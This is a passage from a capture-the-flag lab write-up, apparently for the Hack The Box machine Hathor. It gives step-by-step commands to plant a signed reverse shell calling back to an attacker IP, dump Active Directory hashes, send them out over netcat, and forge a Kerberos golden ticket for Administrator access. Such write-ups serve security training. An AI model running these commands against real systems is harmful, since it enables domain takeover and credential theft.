'' SIG '' UWJd0zS9yauHZNuv2zHTCj/sfOAQDecI2TTjRG2Syf36
'' SIG '' 2T0a0G7c2E/HJDgETEVpgg==
'' SIG '' End signature block
```

So, when this `run.vbs` file is executed it creates an event in the Windows event log ([documentation about eventcreate](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/eventcreate)). I think something picks up that event and executes the `C:\Get-bADpasswords\Get-bADpasswords.ps1` script as a different user. So, if we replace the `Get-bADpasswords.ps1` with a reverse shell and sign it with the certificate, we should get a reverse shell.

First, create a temporary directory with `mkdir C:\Temp` and then run `copy C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx C:\Temp\sign.pfx` to copy the certificate. Start a listener wtih `nc -nvlp 3997`. Next, run `cmd.exe /c "echo C:\share\Bginfo64.exe 10.10.14.116 3997 -e cmd.exe > C:\Get-bADpasswords\Get-bADpasswords.ps1"`. Then, import the pfx and sign the script by running the following with the password we found (make sure to run in powershell):

```powershell
certutil -user -p abceasyas123 -importpfx C:\Temp\sign.pfx NoChain,NoRoot
$all_certs = Get-ChildItem cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature C:\Get-bADpasswords\Get-bADpasswords.ps1 -Certificate $all_certs[0]
```

Now, just run the VBS script with `cscript C:\Get-bADpasswords\run.vbs`. After a few seconds, you should get a reverse shell as `windcorp\bpassrunner`.

## Privilege Escalation (Part 2)

For this part we perform a [Golden Ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket). To do this we need to the NTLM hash of the `KRBTGT` user, an account used for Kerberos. You can learn more about the `KRBTGT` user in [this article](https://blog.quest.com/what-is-krbtgt-and-why-should-you-change-the-password/).

We can run [Get-ADReplAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADReplAccount.md) with `get-adreplaccount -all -namingcontext 'DC=windcorp,DC=htb' -server hathor > hashes` to create a file called `hashes` with the hashes for many accounts.

We run the following commands to determine that the file is 42.8 MB:

```powershell
$file = "hashes"
Write-Host((Get-Item $file).length/1MB)
```

So, we run `nc -nvlp 57010 > hashes` on our machine and `cmd /c "C:\share\Bginfo64.exe 10.10.14.116 57010 < hashes"` on the target too download the file. Tip: Use a command like `watch ls -lh hashes` to watch the file transfer progress.

Looking at the `hashes` file we find that the `krbtgt` NTLM hash is `c639e5b331b0e5034c33dec179dcc792`. Now, we can request a ticket as the `Administrator` user by running `ticketer.py -nthash c639e5b331b0e5034c33dec179dcc792 -domain-sid S-1-5-21-3783586571-2109290616-3725730865 -domain windcorp.htb Administrator`.

Then, we store the path to the ticket by running `export KRB5CCNAME=administrator.ccache`. Finally, we run `wmiexec.py -no-pass -k -dc-ip hathor.windcorp.htb windcorp.htb/administrator@hathor.windcorp.htb` to get a shell as the `Administrator` user. Then, just execute `type C:\Users\Administrator\Desktop\root.txt` to get the `root.txt` flag.
